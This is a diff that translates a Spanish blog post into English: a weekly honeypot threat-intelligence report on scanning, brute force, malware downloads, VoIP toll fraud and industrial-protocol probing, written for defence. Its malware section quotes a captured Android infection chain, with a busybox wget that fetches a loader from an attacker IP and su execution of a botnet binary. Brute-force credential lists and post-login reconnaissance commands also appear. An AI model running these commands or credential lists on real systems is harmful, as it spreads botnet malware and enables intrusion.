@@ -1,111 +1,111 @@
 ---
-title: "Informe Semanal de Threat Intelligence — Honeypot T-Pot (7–11 julio 2026)"
+title: "Weekly Threat Intelligence Report — T-Pot Honeypot (Jul 7–11, 2026)"
 date: 2026-07-12
 draft: false
-description: "Primer informe semanal del honeypot T-Pot: ~1.011.000 eventos en 10 sensores, malware Redtail multi-arquitectura, cadena de infección Android completa (Rebirth → UFO Miner → Trinity), escaneo de servicios de IA expuestos (Ollama, Gradio), sondeo IEC-104 sobre ConPot y campaña de toll fraud VoIP en Sentrypeer."
+description: "First weekly report from the T-Pot honeypot: ~1,011,000 events across 10 sensors, Redtail multi-architecture malware, complete Android infection chain (Rebirth → UFO Miner → Trinity), scanning of exposed AI services (Ollama, Gradio), IEC-104 probing on ConPot, and VoIP toll fraud campaign on Sentrypeer."
 tags: ["Honeypot", "TPot", "ThreatIntel", "SOC", "BlueTeam", "Cowrie", "Dionaea", "Adbhoney", "Sentrypeer", "ConPot", "Honeytrap", "Suricata", "Redtail", "Rebirth", "Trinity", "ICS", "SCADA", "VoIP", "TollFraud", "Malware", "IoT", "Botnet"]
 categories: ["Honeypot Diaries"]
 ---
 
 {{< lead >}}
-Primer informe semanal del honeypot T-Pot. Durante la semana del **7 al 11 de julio de 2026** se registraron aproximadamente **1.011.000 eventos de ataque** distribuidos en 10 sensores activos. Lo más destacado: malware *Redtail* multi-arquitectura capturado en Cowrie, una cadena de infección Android completa en Adbhoney (Rebirth → minero UFO → botnet Trinity), escaneo activo de servicios de IA expuestos (Ollama, Gradio, Streamlit) y sondeo del protocolo IEC-104 usado en subestaciones eléctricas europeas.
+First weekly report from the T-Pot honeypot. During the week of **July 7–11, 2026**, approximately **1,011,000 attack events** were recorded across 10 active sensors. Top findings: multi-architecture *Redtail* malware captured in Cowrie, a complete Android infection chain in Adbhoney (Rebirth → UFO miner → Trinity botnet), active scanning of exposed AI services (Ollama, Gradio, Streamlit), and probing of the IEC-104 protocol used in European electrical substations.
 {{< /lead >}}
 
 ---
 
-**Período analizado:** 7 – 11 de julio de 2026
-**Fuente:** T-Pot (multi-honeypot + ELK Stack) — instancia expuesta públicamente en internet
-**Clasificación:** Uso en portfolio / TLP:CLEAR
+**Period analyzed:** July 7–11, 2026
+**Source:** T-Pot (multi-honeypot + ELK Stack) — publicly internet-exposed instance
+**Classification:** Portfolio use / TLP:CLEAR
 
 ---
 
-## 1. Resumen Ejecutivo
+## 1. Executive Summary
 
-Durante la semana analizada, el honeypot registró **~1.011.000 eventos de ataque** distribuidos en 10 sensores activos, procedentes de miles de IPs de origen únicas. La actividad no fue uniforme: se observa un **pico de tráfico claro entre el 9 y el 10 de julio**, coincidente en casi todos los sensores simultáneamente, lo que sugiere una o varias campañas de escaneo masivo lanzadas en ese intervalo más que actividad orgánica constante.
+During the analyzed week, the honeypot recorded **~1,011,000 attack events** across 10 active sensors, originating from thousands of unique source IPs. Activity was not uniform: a **clear traffic spike between July 9 and 10** is observed across nearly all sensors simultaneously, suggesting one or more mass scanning campaigns launched in that interval rather than constant organic activity.
 
-Los hallazgos más relevantes de la semana:
+Most relevant findings of the week:
 
-- **Malware multi-arquitectura capturado en Cowrie** (familia *Redtail*, binarios para ARM7, ARM8, i686 y x86_64), descargado tras fuerza bruta SSH exitosa.
-- **Cadena de infección Android completa capturada en Adbhoney**: descarga de loader (`rebirth.arm7`), instalación de una app de minería (`com.ufo.miner`) y ejecución de un binario asociado a la familia *Trinity*.
-- **Escaneo dirigido a servicios de IA expuestos** (Ollama, Gradio, Streamlit) detectado en Honeytrap — un patrón propio de 2025-2026, no del malware "clásico" de IoT.
-- **Sondeo del protocolo IEC-104** (puerto 2404) en ConPot — protocolo usado en sistemas de control de subestaciones eléctricas europeas.
-- **Actividad de toll fraud contra Sentrypeer**, con numeración objetivo en formato francés e internacional y métodos SIP `INVITE`/`REGISTER` predominantes.
-- El **99%+ del tráfico está catalogado como "known attacker"** por reputación de IP — infraestructura ya fichada en bases de datos de amenazas, no ruido aleatorio de internet.
-- Una parte relevante del volumen (*Modat B.V.*, *ONYPHE SAS*) corresponde a **escáneres de investigación de internet conocidos** (tipo Shodan/Censys), no necesariamente actores maliciosos — matiz importante para no sobrestimar el nivel de amenaza real.
+- **Multi-architecture malware captured in Cowrie** (*Redtail* family, binaries for ARM7, ARM8, i686, and x86_64), downloaded after successful SSH brute force.
+- **Complete Android infection chain captured in Adbhoney**: loader download (`rebirth.arm7`), mining app installation (`com.ufo.miner`), and execution of a *Trinity* family binary.
+- **Targeted scanning of exposed AI services** (Ollama, Gradio, Streamlit) detected in Honeytrap — a pattern characteristic of 2025–2026, not "classic" IoT malware.
+- **IEC-104 protocol probing** (port 2404) in ConPot — the standard telecontrol protocol used in European electrical substation control systems.
+- **Toll fraud activity against Sentrypeer**, targeting French and international number ranges, with SIP `INVITE`/`REGISTER` methods dominant.
+- **99%+ of traffic is flagged as "known attacker"** by IP reputation — infrastructure already catalogued in threat databases, not random internet noise.
+- A significant portion of the volume (*Modat B.V.*, *ONYPHE SAS*) corresponds to **known internet research scanners** (like Shodan/Censys), not necessarily malicious actors — an important nuance to avoid overestimating the actual threat level.
 
 ---
 
-## 2. Volumetría y Tendencia Semanal
+## 2. Volume and Weekly Trend
 
-| Honeypot | Eventos (semana) | IPs únicas | % del total |
+| Honeypot | Events (week) | Unique IPs | % of total |
 |---|---:|---:|---:|
-| Honeytrap | 678.792 | 6.119 | 67,2% |
-| Cowrie (SSH/Telnet) | 116.390 | 823 | 11,5% |
-| RDPHoneypot | 111.818 | 250 | 11,1% |
-| Dionaea | 61.123 | 683 | 6,0% |
-| Sentrypeer (SIP/VoIP) | 36.522 | 112 | 3,6% |
-| Adbhoney (Android ADB) | 2.618 | 63 | 0,3% |
-| Tanner | ~2.000 | — | 0,2% |
-| ConPot (ICS/SCADA) | 1.594 | 128 | 0,2% |
-| Mailoney | 906 | — | 0,1% |
-| Honeyaml | 660 | — | 0,1% |
-| **Total aprox.** | **~1.011.000** | — | 100% |
+| Honeytrap | 678,792 | 6,119 | 67.2% |
+| Cowrie (SSH/Telnet) | 116,390 | 823 | 11.5% |
+| RDPHoneypot | 111,818 | 250 | 11.1% |
+| Dionaea | 61,123 | 683 | 6.0% |
+| Sentrypeer (SIP/VoIP) | 36,522 | 112 | 3.6% |
+| Adbhoney (Android ADB) | 2,618 | 63 | 0.3% |
+| Tanner | ~2,000 | — | 0.2% |
+| ConPot (ICS/SCADA) | 1,594 | 128 | 0.2% |
+| Mailoney | 906 | — | 0.1% |
+| Honeyaml | 660 | — | 0.1% |
+| **Approx. total** | **~1,011,000** | — | 100% |
 
-Honeytrap concentra dos tercios del volumen total, pero esto es engañoso si se interpreta como "el honeypot más atacado" — Honeytrap responde en casi cualquier puerto TCP, así que absorbe todo el ruido de escaneo genérico de internet. Cowrie y RDPHoneypot, con muchos menos eventos pero interacciones más completas (login, ejecución de comandos, sesión), son los que aportan inteligencia de mayor calidad.
+Honeytrap concentrates two-thirds of total volume, but this is misleading if interpreted as "the most attacked honeypot" — Honeytrap responds on nearly any TCP port, so it absorbs all generic internet scanning noise. Cowrie and RDPHoneypot, with far fewer events but more complete interactions (login, command execution, sessions), yield higher-quality intelligence.
 
-La tendencia temporal muestra actividad de fondo constante con un **pico pronunciado entre el 9 y 10 de julio**, visible de forma consistente en Honeytrap, RDPHoneypot y Adbhoney simultáneamente — indicio de que ese día se lanzó (o completó un ciclo de reconocimiento) una campaña de escaneo a gran escala que tocó múltiples servicios expuestos en la instancia.
+The temporal trend shows constant background activity with a **pronounced spike between July 9–10**, consistently visible across Honeytrap, RDPHoneypot, and Adbhoney simultaneously — indicating a large-scale scanning campaign was launched (or completed a reconnaissance cycle) that day, touching multiple exposed services on the instance.
 
 ---
 
-## 3. Análisis Geográfico y de Infraestructura
+## 3. Geographic and Infrastructure Analysis
 
-### Países de origen más recurrentes
+### Most frequent countries of origin
 
-Canadá, Brasil, Francia, Singapur, Estados Unidos, Países Bajos, Bulgaria, Azerbaiyán, China e India aparecen de forma recurrente entre los distintos honeypots, con variaciones según el protocolo: Bulgaria/Azerbaiyán destacan en RDP, China/India en Cowrie.
+Canada, Brazil, France, Singapore, United States, Netherlands, Bulgaria, Azerbaijan, China, and India appear consistently across different honeypots, with variations by protocol: Bulgaria/Azerbaijan stand out in RDP, China/India in Cowrie.
 
-### ASN / Hosting más frecuentes
+### Most frequent ASN / Hosting
 
-| ASN | Organización | Honeypot | Eventos |
+| ASN | Organization | Honeypot | Events |
 |---|---|---|---:|
-| 209334 | Modat B.V. | Honeytrap | 346.372 |
-| 264897 | SKYMAX Telecomunicações | Honeytrap | 113.038 |
-| 202053 | UpCloud Ltd | Honeytrap | 76.039 |
-| 14061 | DigitalOcean, LLC | Cowrie | 21.687 |
-| 197170 | TechTies Inc. | Cowrie | 20.894 |
-| 201814 | MEVSPACE sp. z o.o. | RDPHoneypot | 39.105 |
-| 213438 | ColocaTel Inc. | RDPHoneypot | 37.466 |
-| 23470 | ReliableSite.Net LLC | Adbhoney | 2.021 |
+| 209334 | Modat B.V. | Honeytrap | 346,372 |
+| 264897 | SKYMAX Telecomunicações | Honeytrap | 113,038 |
+| 202053 | UpCloud Ltd | Honeytrap | 76,039 |
+| 14061 | DigitalOcean, LLC | Cowrie | 21,687 |
+| 197170 | TechTies Inc. | Cowrie | 20,894 |
+| 201814 | MEVSPACE sp. z o.o. | RDPHoneypot | 39,105 |
+| 213438 | ColocaTel Inc. | RDPHoneypot | 37,466 |
+| 23470 | ReliableSite.Net LLC | Adbhoney | 2,021 |
 
-> **Nota:** *Modat B.V.* y *ONYPHE SAS* son organizaciones conocidas de **escaneo de internet con fines de investigación/threat intelligence** (comparables a Censys o Shodan). Un analista no cuenta este tráfico igual que el de un botnet: es ruido de fondo de internet, útil para perspectiva pero no indicativo de intención hostil dirigida.
+> **Note:** *Modat B.V.* and *ONYPHE SAS* are known **internet scanning organizations for research/threat intelligence purposes** (comparable to Censys or Shodan). An analyst doesn't count this traffic the same as botnet traffic: it's internet background noise, useful for perspective but not indicative of directed hostile intent.
 
-En cambio, **ReliableSite.Net concentra el 77% de todo el tráfico de Adbhoney** (2.021 de 2.618 eventos) — señal de campaña concentrada, un único operador reutilizando infraestructura bulletproof.
+In contrast, **ReliableSite.Net concentrates 77% of all Adbhoney traffic** (2,021 of 2,618 events) — a sign of a concentrated campaign, a single operator reusing bulletproof infrastructure.
 
-### Patrón de subred repetida
+### Repeated subnet pattern
 
-Las IPs `45.153.34.149`, `.151`, `.161` y `.181` aparecen en Cowrie con conteos casi idénticos (~3.817 eventos cada una). Firma típica de un **operador rotando IPs dentro de un mismo /24** para evadir bloqueos por IP individual — un IDS bien configurado debería bloquear a nivel de subred, no de IP suelta.
+IPs `45.153.34.149`, `.151`, `.161`, and `.181` appear in Cowrie with nearly identical counts (~3,817 events each). Classic signature of an **operator rotating IPs within the same /24** to evade per-IP blocking — a well-configured IDS should block at the subnet level, not individual IPs.
 
 ---
 
-## 4. TTPs Observadas
+## 4. Observed TTPs
 
-### 4.1 Credenciales objetivo — fuerza bruta SSH/RDP (Cowrie)
+### 4.1 Target credentials — SSH/RDP brute force (Cowrie)
 
-| Usuario | Intentos | | Contraseña | Intentos |
+| Username | Attempts | | Password | Attempts |
 |---|---:|---|---|---:|
-| Administrator | 12.939 | | (vacío) | 29.534 |
-| root | 4.993 | | 123456 | 896 |
+| Administrator | 12,939 | | (empty) | 29,534 |
+| root | 4,993 | | 123456 | 896 |
 | admin | 845 | | 1234 | 336 |
 | ubuntu | 298 | | password | 304 |
 | user | 265 | | 12345678 | 233 |
 | sa | 256 | | 123 | 380 |
 
-El dominio de `Administrator` (12.939 sobre 15.096 con nombre capturado) es coherente con ataques dirigidos a **RDP/Windows**. El usuario `sa` confirma sondeo a bases de datos MSSQL expuestas. Las contraseñas mezclan diccionarios genéricos con patrones "sofisticados falsos" (`P@ssw0rd2025`, `Admin@123`) diseñados para superar políticas básicas de complejidad.
+The dominance of `Administrator` (12,939 of 15,096 captured usernames) is consistent with attacks targeting **RDP/Windows**. The `sa` user confirms MSSQL database probing. Passwords mix generic dictionaries with "fake complex" patterns (`P@ssw0rd2025`, `Admin@123`) designed to pass basic complexity policies.
 
-Detalle curioso: `345gs5662d34` / `3245gs5662d34` aparecen tanto como usuario como contraseña con conteos idénticos (102) — patrón de un script con un diccionario mal formado que prueba estas cadenas en ambos campos por defecto de fallback.
+Curious detail: `345gs5662d34` / `3245gs5662d34` appear both as username and password with identical counts (102) — pattern of a script with a malformed dictionary that tries these strings in both fields as a fallback default.
 
-### 4.2 Post-explotación — reconocimiento tras login (Cowrie)
+### 4.2 Post-exploitation — reconnaissance after login (Cowrie)
 
-Secuencia de comandos más repetida tras un login válido simulado:
+Most repeated command sequence after a simulated valid login:
 
 ```bash
 uname -a
@@ -116,142 +116,142 @@ ls -lh $(which ls)
 top
 ```
 
-Esto es un **script de fingerprinting de sistema pre-despliegue de payload**: recopila CPU, arquitectura y RAM antes de decidir qué binario descargar. El comando `chattr -ia .ssh` es especialmente revelador — **bloquea el directorio `.ssh` con el atributo inmutable** para impedir que otros actores o el propio administrador modifiquen las claves SSH. Técnica de "territorio marcado" habitual en gusanos que compiten entre sí por el mismo host.
+This is a **pre-payload system fingerprinting script**: it collects CPU, architecture, and RAM before deciding which binary to download. The `chattr -ia .ssh` command is especially revealing — **it locks the `.ssh` directory with the immutable attribute** to prevent other actors or the administrator from modifying SSH keys. A "marked territory" technique common in worms competing with each other for the same host.
 
-### 4.3 Alertas Suricata
+### 4.3 Suricata Alerts
 
-| Firma | Count |
+| Signature | Count |
 |---|---:|
-| SURICATA STREAM Packet with broken ack | 173.847 |
-| SURICATA STREAM spurious retransmission | 96.038 |
-| SURICATA AF-PACKET truncated packet | 82.279 |
-| SURICATA IPv4 truncated packet | 81.337 |
-| SURICATA SSH invalid banner | 15.412 |
-| ET INFO SSH session in progress on Expected Port | 5.560 |
+| SURICATA STREAM Packet with broken ack | 173,847 |
+| SURICATA STREAM spurious retransmission | 96,038 |
+| SURICATA AF-PACKET truncated packet | 82,279 |
+| SURICATA IPv4 truncated packet | 81,337 |
+| SURICATA SSH invalid banner | 15,412 |
+| ET INFO SSH session in progress on Expected Port | 5,560 |
 
-El grueso son **escáneres agresivos y mal implementados** (conexiones TCP mal cerradas, banners SSH inválidos de herramientas automatizadas), no exploits activos. Importante no presentar los 173.847 paquetes rotos como "173.847 ataques" — es telemetría de ruido de fondo, no intentos de intrusión reales.
+The bulk are **aggressive, poorly implemented scanners** (improperly closed TCP connections, invalid SSH banners from automated tools), not active exploits. Important: don't present the 173,847 broken packets as "173,847 attacks" — it's background noise telemetry, not real intrusion attempts.
 
-### 4.4 CVEs correlacionados por Suricata
+### 4.4 CVEs correlated by Suricata
 
-| CVE | Detecciones | Familia |
+| CVE | Detections | Family |
 |---|---:|---|
 | CVE-1999-0016 | 12 | Land attack (IP spoofing) |
 | CVE-2022-37055 | 11 | — |
-| CVE-2019-12263 y relacionados | 7 | — |
-| CVE-2020-11900 | 3 | Ripple20 (pila TCP/IP Treck, IoT/ICS) |
+| CVE-2019-12263 and related | 7 | — |
+| CVE-2020-11900 | 3 | Ripple20 (Treck TCP/IP stack, IoT/ICS) |
 | CVE-2020-11910 | 1 | Ripple20 |
 
-CVE-2020-11900/11910 pertenecen a la familia **Ripple20** (pila TCP/IP Treck usada en dispositivos IoT/industriales), coherente con el perfil general de tráfico oportunista contra dispositivos embebidos de toda la semana.
+CVE-2020-11900/11910 belong to the **Ripple20** family (Treck TCP/IP stack used in IoT/industrial devices), consistent with the general profile of opportunistic traffic against embedded devices throughout the week.
 
-### 4.5 Escaneo de servicios de IA expuestos (Honeytrap)
+### 4.5 Scanning of exposed AI services (Honeytrap)
 
-| Puerto | Servicio típico |
+| Port | Typical service |
 |---|---|
-| 11434 | Ollama (API de inferencia LLM) |
-| 7860 | Gradio (interfaz web de demos ML/IA) |
-| 8501 | Streamlit (dashboards ML/IA) |
-| 1337 | Clásico de herramientas de hacking |
-| 8728 | API de MikroTik (routers) |
+| 11434 | Ollama (LLM inference API) |
+| 7860 | Gradio (ML/AI demo web interface) |
+| 8501 | Streamlit (ML/AI dashboards) |
+| 1337 | Classic hacking tool port |
+| 8728 | MikroTik API (routers) |
 
-El escaneo activo y sostenido contra **Ollama, Gradio y Streamlit** es un hallazgo distintivo: confirma que los actores de amenazas ya incorporan **infraestructura de IA autoalojada mal asegurada** como objetivo de reconocimiento masivo, en la misma categoría que routers o cámaras IP expuestas. En 2026 esto ya no es una tendencia emergente — es tráfico de fondo.
+Active and sustained scanning against **Ollama, Gradio, and Streamlit** is a distinctive finding: it confirms that threat actors have already incorporated **poorly secured self-hosted AI infrastructure** as a mass reconnaissance target, in the same category as exposed routers or IP cameras. In 2026 this is no longer an emerging trend — it's background traffic.
 
 ---
 
-## 5. Malware y Payloads Capturados
+## 5. Captured Malware and Payloads
 
-### 5.1 Cowrie — familia *Redtail* (multi-arquitectura)
+### 5.1 Cowrie — *Redtail* family (multi-architecture)
 
-Tras intentos de login exitosos, se capturaron descargas de:
+After successful login attempts, the following downloads were captured:
 
 - `redtail.arm7`
 - `redtail.arm8`
 - `redtail.i686`
 - `redtail.x86_64`
 
-La compilación para **cuatro arquitecturas** (ARM 32/64-bit, x86 e x86_64) confirma un loader diseñado para maximizar compatibilidad entre servidores cloud (x86_64), dispositivos embebidos ARM y sistemas legacy (i686) — patrón típico de botnets de minería de criptomonedas modernas que no distinguen tipo de víctima.
+Compilation for **four architectures** (ARM 32/64-bit, x86, and x86_64) confirms a loader designed to maximize compatibility across cloud servers (x86_64), embedded ARM devices, and legacy systems (i686) — typical pattern of modern cryptocurrency mining botnets that don't discriminate by victim type.
 
-### 5.2 Adbhoney — cadena de infección Android completa
+### 5.2 Adbhoney — Complete Android infection chain
 
-La captura más completa de la semana. Secuencia observada íntegramente:
+The most complete capture of the week. Sequence observed in full:
 
 ```bash
-# 1. Descarga del loader (botnet Rebirth, variante Mirai-like)
+# 1. Loader download (Rebirth botnet, Mirai-like variant)
 busybox wget http://94.154.43.48/rebirth.arm7 -O /data/local/tmp/com.sup[...]
 
-# 2. Instalación de APK de minería
+# 2. Mining APK installation
 pm install /data/local/tmp/ufo.apk
 
-# 3. Ejecución del minero
+# 3. Miner execution
 am start -n com.ufo.miner/com.example.test.MainActivity
 
-# 4. Ejecución de binario Trinity (segunda familia de botnet)
+# 4. Trinity binary execution (second botnet family)
 ps | grep trinity
 /data/local/tmp/nohup su -c /data/local/tmp/trinity
 ```
 
-Esto documenta de principio a fin cómo un actor automatizado usa un dispositivo Android con ADB expuesto (smart TVs, cajas TV Android, emuladores mal configurados) para: **descargar loader → instalar APK de minería → ejecutar un segundo binario de botnet**. Tres familias distintas en una única sesión de infección.
+This documents from start to finish how an automated actor uses an Android device with exposed ADB (smart TVs, Android TV boxes, misconfigured emulators) to: **download loader → install mining APK → execute a second botnet binary**. Three distinct families in a single infection session.
 
 ---
 
-## 6. Dionaea — Servicios de Base de Datos y Ficheros
+## 6. Dionaea — Database and File Services
 
-**61.123 ataques, 683 IPs únicas.** Dionaea simula servicios vulnerables clásicos (SMB, RPC, MySQL, MSSQL, MongoDB, FTP, PPTP, MQTT).
+**61,123 attacks, 683 unique IPs.** Dionaea simulates classic vulnerable services (SMB, RPC, MySQL, MSSQL, MongoDB, FTP, PPTP, MQTT).
 
-El protocolo dominante es **SMB** (puerto 445), seguido de `epmapper` (RPC, puerto 135), `mysqld` (3306) y `mssqld` (1433) — los mismos vectores que popularizó WannaCry, todavía vigentes.
+The dominant protocol is **SMB** (port 445), followed by `epmapper` (RPC, port 135), `mysqld` (3306), and `mssqld` (1433) — the same vectors popularized by WannaCry, still active.
 
-Las credenciales probadas (`admin`, `sa`, `root`, `anonymous`) son cuentas por defecto de MSSQL y MongoDB/FTP, no diccionarios masivos — patrón de explotación más dirigido a servicios específicos que de fuerza bruta genérica.
+Tested credentials (`admin`, `sa`, `root`, `anonymous`) are default MSSQL and MongoDB/FTP accounts, not mass dictionaries — a pattern more targeted at specific services than generic brute force.
 
-Las IPs `62.84.80.240` a `62.84.80.243` (cuatro direcciones consecutivas, ~5.600-5.700 eventos cada una) repiten el **patrón de rotación dentro de una misma subred /29-/30** ya visto en Cowrie.
+IPs `62.84.80.240` to `62.84.80.243` (four consecutive addresses, ~5,600–5,700 events each) repeat the **rotation pattern within the same /29–/30 subnet** already seen in Cowrie.
 
-| ASN | Organización | Eventos |
+| ASN | Organization | Events |
 |---|---|---:|
-| 42334 | Broadband Plus S.a.l. (Líbano) | 22.578 |
-| 58224 | Iran Telecommunication Company PJS | 14.225 |
-| 56041 | China Mobile Communications | 6.302 |
-| 45899 | VNPT Corp (Vietnam) | 3.230 |
+| 42334 | Broadband Plus S.a.l. (Lebanon) | 22,578 |
+| 58224 | Iran Telecommunication Company PJS | 14,225 |
+| 56041 | China Mobile Communications | 6,302 |
+| 45899 | VNPT Corp (Vietnam) | 3,230 |
 
 ---
 
-## 7. Sentrypeer — Fraude Telefónico (Toll Fraud) sobre SIP/VoIP
+## 7. Sentrypeer — Telephone Fraud (Toll Fraud) over SIP/VoIP
 
-**36.522 ataques, 112 IPs únicas.** Actividad prácticamente nula hasta el 9 de julio, cuando arranca de golpe y se mantiene elevada el resto de la semana — inicio de una campaña concreta de reconocimiento/fraude VoIP durante la ventana analizada.
+**36,522 attacks, 112 unique IPs.** Virtually no activity until July 9, when it suddenly spikes and stays elevated the rest of the week — the start of a specific VoIP reconnaissance/fraud campaign within the analyzed window.
 
-El método SIP dominante es **INVITE** (intento de iniciar una llamada), seguido de `REGISTER` (registro de extensión falsa). Los user-agents capturados (`Linksys-SPA942`, `Avaya one-X Deskphone`, `Yealink SIP-T54W`, `Cisco-SIPGateway`, `FPBX-15.0.17`) son perfiles de teléfonos IP y centralitas reales, típico de escáneres que rotan huellas de cliente SIP para pasar desapercibidos.
+The dominant SIP method is **INVITE** (attempt to initiate a call), followed by `REGISTER` (fake extension registration). Captured user-agents (`Linksys-SPA942`, `Avaya one-X Deskphone`, `Yealink SIP-T54W`, `Cisco-SIPGateway`, `FPBX-15.0.17`) are profiles of real IP phones and PBX systems, typical of scanners that rotate SIP client fingerprints to avoid detection.
 
-La numeración objetivo en prefijo `0033` (Francia) e `0016...` (Norteamérica) es consistente con **toll fraud**: el objetivo es conseguir que la centralita comprometida origine llamadas a números de tarificación especial que generan ingresos para el atacante.
+Target numbers with prefix `0033` (France) and `0016...` (North America) are consistent with **toll fraud**: the goal is to get the compromised PBX to originate calls to premium rate numbers that generate revenue for the attacker.
 
-Las IPs `217.154.196.x` / `217.154.197.x` y `31.70.86.6x` repiten el patrón de bloques contiguos observado en otros sensores esta semana.
-
----
-
-## 8. ConPot — Reconocimiento de Infraestructura Industrial (ICS/SCADA)
-
-**1.594 ataques, 128 IPs únicas.** Volumen bajo, pero el honeypot simula infraestructura de control industrial — cualquier interacción es relevante por el tipo de objetivo, no por el número.
-
-La actividad arranca igual que Sentrypeer: prácticamente nula antes del 9 de julio, con subida sostenida a partir de esa fecha. Segundo indicio de que el 9 de julio marcó el inicio de una **ventana de reconocimiento más amplia contra la instancia**, no solo actividad puntual en un sensor.
-
-### Protocolos y puertos
-
-El protocolo dominante es **SNMP** (puerto 161, ~50% del tráfico), seguido de `guardian_ast` (puerto 10001, sistemas de monitorización de tanques de combustible) y, puntualmente, `kamstrup_protocol` (contadores inteligentes de energía) e **IEC-104** (puerto 2404).
-
-**IEC-104 merece mención aparte:** es el protocolo estándar de telecontrol usado en subestaciones eléctricas europeas. Que aparezca sondeo activo contra este puerto, aunque sea con volumen bajo, es un dato que un SOC de operador energético consideraría de alta prioridad — en un honeypot de investigación es una muestra de que existen actores escaneando activamente puertos ICS de sector eléctrico, no solo SNMP genérico.
+IPs `217.154.196.x` / `217.154.197.x` and `31.70.86.6x` repeat the contiguous block pattern observed across other sensors this week.
 
 ---
 
-## 9. Conclusiones
+## 8. ConPot — Industrial Infrastructure (ICS/SCADA) Reconnaissance
 
-1. **El pico del 9-10 de julio** se refleja simultáneamente en Honeytrap, RDPHoneypot, Adbhoney, Sentrypeer y ConPot. Cinco sensores distintos subiendo a la vez apunta a una campaña de reconocimiento coordinada o lanzada desde infraestructura compartida, no a coincidencia.
+**1,594 attacks, 128 unique IPs.** Low volume, but the honeypot simulates industrial control infrastructure — any interaction is relevant based on the type of target, not the number.
 
-2. **Bloquear por subred /24, no por IP individual.** El patrón de rotación entre IPs contiguas del mismo operador (visible en Cowrie, Dionaea y Sentrypeer) hace ineficaz el bloqueo IP-a-IP. Un bloqueo a nivel de /24 o incluso /20 habría eliminado miles de eventos antes de que llegaran al sensor.
+Activity starts exactly like Sentrypeer: virtually none before July 9, with sustained growth from that date. Second indicator that July 9 marked the start of a **broader reconnaissance window against the instance**, not just isolated activity on one sensor.
 
-3. **Ollama, Gradio y Streamlit ya están en los diccionarios de escaneo masivo.** Cualquier entorno con estos servicios expuestos sin autenticación debe tratarse con la misma prioridad que un RDP o SSH expuesto — no son "herramientas de developer", son servicios HTTP sin auth accesibles desde internet.
+### Protocols and ports
 
-4. **Diferenciar ruido de protocolo de alertas con intención real.** Los 173.000+ eventos de Suricata STREAM broken ack son consecuencia de herramientas de escaneo mal implementadas, no intentos de intrusión. Presentarlos como ataques infla artificialmente la severidad percibida del informe.
+The dominant protocol is **SNMP** (port 161, ~50% of traffic), followed by `guardian_ast` (port 10001, fuel tank monitoring systems), and occasionally `kamstrup_protocol` (smart energy meters) and **IEC-104** (port 2404).
 
-5. **La cadena Rebirth → UFO Miner → Trinity** capturada en Adbhoney es un caso de estudio completo de infección Android/IoT; merece un post técnico independiente.
-
-6. **El sondeo de IEC-104 en ConPot** debe mantenerse en vigilancia: cualquier repunte futuro en ese puerto específico, en combinación con otro sensor activo, merece atención prioritaria por el tipo de infraestructura que simula.
+**IEC-104 deserves special mention:** it's the standard telecontrol protocol used in European electrical substations. Active probing against this port, even at low volume, is data a power operator's SOC would consider high priority — in a research honeypot it's evidence that actors are actively scanning ICS ports in the electrical sector, not just generic SNMP.
 
 ---
 
-*Informe elaborado a partir de datos propios recogidos en una instancia T-Pot expuesta públicamente a internet. Metodología: exportación de paneles agregados de Kibana (rango 7–11 julio 2026) más tagclouds de credenciales en CSV.*
+## 9. Conclusions
+
+1. **The July 9–10 spike** is reflected simultaneously across Honeytrap, RDPHoneypot, Adbhoney, Sentrypeer, and ConPot. Five different sensors rising at the same time points to a coordinated or shared-infrastructure reconnaissance campaign, not coincidence.
+
+2. **Block at /24 subnet level, not individual IPs.** The rotation pattern among contiguous IPs from the same operator (visible in Cowrie, Dionaea, and Sentrypeer) makes per-IP blocking ineffective. A /24 or even /20 block would have eliminated thousands of events before they reached the sensor.
+
+3. **Ollama, Gradio, and Streamlit are already in mass scanning dictionaries.** Any environment with these services exposed without authentication should be treated with the same priority as an exposed RDP or SSH — they're not "developer tools," they're unauthenticated HTTP services accessible from the internet.
+
+4. **Distinguish protocol noise from alerts with real intent.** The 173,000+ Suricata STREAM broken ack events are a consequence of poorly implemented scanning tools, not intrusion attempts. Presenting them as attacks artificially inflates the report's perceived severity.
+
+5. **The Rebirth → UFO Miner → Trinity chain** captured in Adbhoney is a complete Android/IoT infection case study; it warrants a separate technical post.
+
+6. **IEC-104 probing in ConPot** should be kept under watch: any future uptick on that specific port, in combination with another active sensor, warrants priority attention given the type of infrastructure it simulates.
+
+---
+
+*Report compiled from data collected in a publicly internet-exposed T-Pot instance. Methodology: export of aggregated Kibana dashboards (range July 7–11, 2026) plus credential tag clouds in CSV.*
